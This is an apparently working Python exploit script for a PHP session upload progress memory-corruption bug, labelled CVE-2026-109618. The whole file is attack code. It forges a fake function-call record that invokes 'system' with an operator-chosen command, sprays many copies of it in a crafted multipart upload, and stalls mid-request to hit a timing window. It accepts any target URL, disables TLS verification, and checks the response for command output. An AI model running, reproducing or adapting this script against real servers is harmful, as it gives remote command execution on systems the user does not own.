#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PHP Session Upload Progress RCE Exploit
CVE-2026-109618 - Stale progress->post_bytes_processed / zend_call_function overwrite

Author: Ghxstsec
Version: 1.6
"""

import argparse
import socket
import ssl
import struct
import sys
import time
import urllib3
from urllib.parse import urlparse

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich import print as rprint
except ImportError:
    print("[-] Error: 'rich' library is required. Install it via: pip install rich")
    sys.exit(1)

# ====================== BANNER ASCII ======================
console = Console()

BANNER = """[bold cyan]
██████╗  ██╗  ██╗██████╗  ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
██╔══██╗ ██║  ██║██╔══██╗╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
██████╔╝ ███████║██████╔╝ █████╔╝███████╗███████║█████╗  ██║     ██║
██╔═══╝  ██╔══██║██╔═══╝ ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
██║      ██║  ██║██║     ███████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
[/bold cyan]
[bold yellow]CVE-2026-109618[/bold yellow] - [bold red]PHP Session Upload Progress RCE[/bold red]

[bold white]Author : Ghxstsec[/bold white]
[bold white]Target : PHP Session Upload Progress (zend_call_function overwrite)[/bold white]
[bold white]----------------------------------------------------------------------[/bold white]
"""

console.print(BANNER)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILL = 5120
N149 = 149
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
DELTA_CALL = 0x43EF0
ZEND_INTERNAL = 1


def forge(call: int, cmd: bytes) -> bytes:
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call)
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200 : 200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(b: bytes, name: str, body: bytes, filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(sid: str, cmd: bytes, call: int) -> tuple[bytes, bytes, dict]:
    b = b"B7kQpoc618"
    blob = forge(call, cmd)
    if b in blob or b"\r\n--" + b in blob:
        raise SystemExit("[-] Error: forge collided with boundary")
    
    pre = b"".join([
        part(b, "PHPSESSID", sid.encode()) + b"\r\n",
        part(b, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n",
        part(b, "f", b"", filename="a") + b"\r\n",
    ])
    
    c1 = b"A" * (FILL + 64)
    phase1 = pre + c1
    
    c2 = b"B" * (FILL + 64)
    tail = c2 + b"\r\n"
    spray = forge(call, cmd)
    for _ in range(N149):
        tail += part(b, "t[]", spray) + b"\r\n"
        
    f2 = b"C" * 64
    tail += part(b, "g", f2, filename="b") + b"\r\n"
    tail += b"--" + b + b"--\r\n"
    
    body = phase1 + tail
    meta = {
        "boundary": b.decode(),
        "phase1": len(phase1),
        "total": len(body),
        "n149": N149,
        "blob": len(spray),
        "call": hex(call),
    }
    return phase1, tail, meta


def talk(url: str, phase1: bytes, tail: bytes, sid: str, stall: float) -> bytes:
    u = urlparse(url)
    host = u.hostname or "localhost"
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
        
    body_len = len(phase1) + len(tail)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: php2shell-109618\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary=B7kQpoc618\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    raw = socket.create_connection((host, port), timeout=40)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    if u.scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(raw, server_hostname=host)
    else:
        ss = raw

    ss.sendall(head + phase1)
    time.sleep(stall)
    ss.sendall(tail)
    ss.settimeout(25)
    
    chunks = []
    while True:
        try:
            d = ss.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    ss.close()
    return b"".join(chunks)


def sapi_of(resp: bytes) -> str:
    try:
        head = resp.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    except Exception:
        return "Unknown"
    turbo = powered = server = ""
    for line in head.split("\r\n"):
        low = line.lower()
        if low.startswith("x-turbo-charged-by:"):
            turbo = line.split(":", 1)[1].strip()
        elif low.startswith("x-powered-by:"):
            powered = line.split(":", 1)[1].strip()
        elif low.startswith("server:"):
            server = line.split(":", 1)[1].strip()
    if "litespeed" in turbo.lower() or "litespeed" in server.lower():
        return f"LiteSpeed LSAPI ({powered})"
    return f"{turbo} {powered} {server}".strip()


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-109618 Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--command", default="uname -a; id; echo JACKALPOC", help="Command")
    parser.add_argument("--sid", default="a1b2c3d4e5f6a7b8c9d0e1f2a3", help="Session ID")
    parser.add_argument("--stall", type=float, default=1.35, help="Stall seconds")
    parser.add_argument("--dtor", default="0", help="Leaked dtor address")
    parser.add_argument("--call", default="", help="zend_call_function address")
    parser.add_argument("--dry", action="store_true", help="Dry run dump")
    
    args = parser.parse_args()

    dtor = int(args.dtor, 0)
    call = int(args.call, 0) if args.call else (dtor - DELTA_CALL if dtor else 0)
    cmd = args.command.encode()

    try:
        console.print(f"[blue][*] Construyendo payload para {args.url}...[/blue]")
        phase1, tail, meta = build(args.sid, cmd, call & 0xFFFFFFFFFFFFFFFF)
        
        console.print(Panel.fit(
            f"[bold]Target:[/bold] {args.url}\n"
            f"[bold]Total Size:[/bold] {meta['total']} bytes\n"
            f"[bold]Call Address:[/bold] {meta['call']}",
            title="[bold yellow]Parameters[/bold yellow]"
        ))

        if args.dry:
            open(r"body-109618.bin", "wb").write(phase1 + tail)
            console.print("[+] [green]Dry run completado.[/green]")
            return

        with console.status("[bold green]Enviando exploit...", spinner="dots"):
            t0 = time.time()
            resp = talk(args.url, phase1, tail, args.sid, args.stall)
            dt = time.time() - t0

        if not resp:
            console.print("[-] [red]Sin respuesta del servidor.[/red]")
            return

        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
        hit = b"JACKALPOC" in body or b"uid=" in body

        console.print(f"[bold]Status:[/bold] {status}")
        console.print(f"[bold]Time:[/bold] {dt:.2f}s | [bold]Length:[/bold] {len(resp)} bytes")

        if hit:
            console.print("[+] [bold green]¡RCE Exitoso![/bold green]")
            idx = body.find(b"uid=")
            if idx < 0:
                idx = body.find(b"JACKALPOC")
            output = body[max(0, idx - 40) : idx + 200].decode("latin1", "replace")
            console.print(Panel(output, title="[bold green]Output[/bold green]"))
        else:
            console.print("[-] [yellow]Salida no detectada directamente:[/yellow]")
            console.print(body[:300].decode("latin1", "replace"))

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
